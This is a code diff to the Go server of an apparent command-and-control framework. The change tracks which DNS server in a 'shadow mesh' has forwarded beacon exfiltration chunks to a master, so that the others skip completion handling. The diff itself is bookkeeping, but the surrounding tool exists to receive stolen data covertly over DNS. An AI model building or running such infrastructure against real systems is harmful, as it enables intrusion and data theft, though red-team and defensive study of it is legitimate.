@@ -96,6 +96,7 @@ type C2Manager struct {
 	db                   *Database                       // Database for persistent storage
 	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
 	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
+	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
 	mutex                sync.RWMutex
 	taskCounter          int // Counter for local tasks (standalone mode)
 	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
@@ -134,6 +135,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 
 	c2 := &C2Manager{
 		beacons:              make(map[string]*Beacon),
+		submittedData:        make(map[string]bool),
 		tasks:                make(map[string]*Task),
 		masterTaskIDs:        make(map[string]string),
 		resultChunks:         make(map[string][]ResultChunk),
@@ -1735,18 +1737,16 @@ func (c2 *C2Manager) handleResultComplete(parts []string, isDuplicate bool) stri
 
 	logf("[C2] Beacon %s completed exfiltration for task %s (%d chunks)", beaconID, taskID, totalChunks)
 
-	// SHADOW MESH: Check if this DNS server has seen any data for this task
-	// If beacon alternated between DNS servers, we may receive RESULT_COMPLETE without having seen chunks
+	// SHADOW MESH: Check if this DNS server has actually submitted data for this task
+	// If beacon alternated between DNS servers, we may receive RESULT_COMPLETE without having sent data
 	c2.mutex.Lock()
-	_, hadExpectation := c2.expectedResults[taskID]
+	submittedData := c2.submittedData[taskID]
 	hasBufferedChunks := len(c2.resultBatchBuffer[taskID]) > 0
 	c2.mutex.Unlock()
 
-	// If we never received RESULT_META or any chunks, another DNS server will handle completion
-	if !hadExpectation && !hasBufferedChunks {
-		if c2.debug {
-			logf("[C2] Task %s has no data on this DNS server, skipping completion (handled by another server in mesh)", taskID)
-		}
+	// If we never submitted data and have no buffered chunks, another DNS server will handle completion
+	if !submittedData && !hasBufferedChunks {
+		logf("[C2] Task %s has no data on this DNS server, skipping completion (handled by another server in mesh)", taskID)
 		return "ACK"
 	}
 
@@ -1760,6 +1760,7 @@ func (c2 *C2Manager) handleResultComplete(parts []string, isDuplicate bool) stri
 
 	// Clean up expected results tracking
 	delete(c2.expectedResults, taskID)
+	delete(c2.submittedData, taskID)
 
 	// Flush any remaining batched chunks immediately
 	if len(c2.resultBatchBuffer[taskID]) > 0 {
@@ -1864,6 +1865,11 @@ func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, master
 	if c2.debug {
 		logf("[C2] Flushing batch of %d chunks for task %s", len(batch), taskID)
 	}
+
+	// Mark that we submitted data for this task
+	c2.mutex.Lock()
+	c2.submittedData[taskID] = true
+	c2.mutex.Unlock()
 
 	// Submit each chunk in the batch
 	var anyComplete bool
